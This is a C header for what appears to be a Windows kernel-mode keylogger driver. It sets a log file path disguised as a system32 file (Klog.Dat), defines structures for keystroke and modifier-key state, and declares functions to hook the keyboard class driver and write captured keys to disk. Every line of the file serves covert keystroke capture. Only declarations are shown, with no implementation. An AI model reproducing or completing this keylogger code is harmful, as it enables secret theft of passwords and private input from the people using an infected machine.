#ifndef __KLOG_H__
#define __KLOG_H__

#define KEYBOARD_RECORD_FILE	L"\\??\\c:\\windows\\system32\\Klog.Dat"


typedef struct _KEY_STATE 
{
	BOOLEAN bIsAlt;
	BOOLEAN bIsCtrl;
	BOOLEAN bIsShift;
	BOOLEAN bIsCapsLock;
	BOOLEAN bIsWindows;
} KEY_STATE,*PKEY_STATE;

typedef struct _KEY_INFO
{
	LIST_ENTRY NextKeyInfo;
	USHORT uMakeCode;
	USHORT uKeyFlags;
	PCHAR pShowKeyDat;
} KEY_INFO,*PKEY_INFO;

typedef struct _KEY_DATA
{
	LIST_ENTRY ListEntry;
	USHORT KeyData;
	USHORT KeyFlags;
	BOOLEAN bIsAlt;
	BOOLEAN bIsCtrl;
	BOOLEAN bIsShift;
	BOOLEAN bIsCapsLock;

} KEY_DATA,*PKEY_DATA;

extern KEY_STATE g_KeyState;
extern LIST_ENTRY g_ListKbdRecord;
extern KSPIN_LOCK g_KbdRecordSpinLock;
extern HANDLE g_hKbdRecord;
extern HANDLE g_hWorkRecord;
extern BOOLEAN g_bExitThread;

NTSTATUS HookKbdClass(BOOLEAN bHook);
BOOLEAN GetKeyFromMakeCode(PKEY_INFO pKeyInfo,PKEY_STATE pKeyState);
NTSTATUS WriteKbdRecord(PKEY_INFO pKeyInfo);

#endif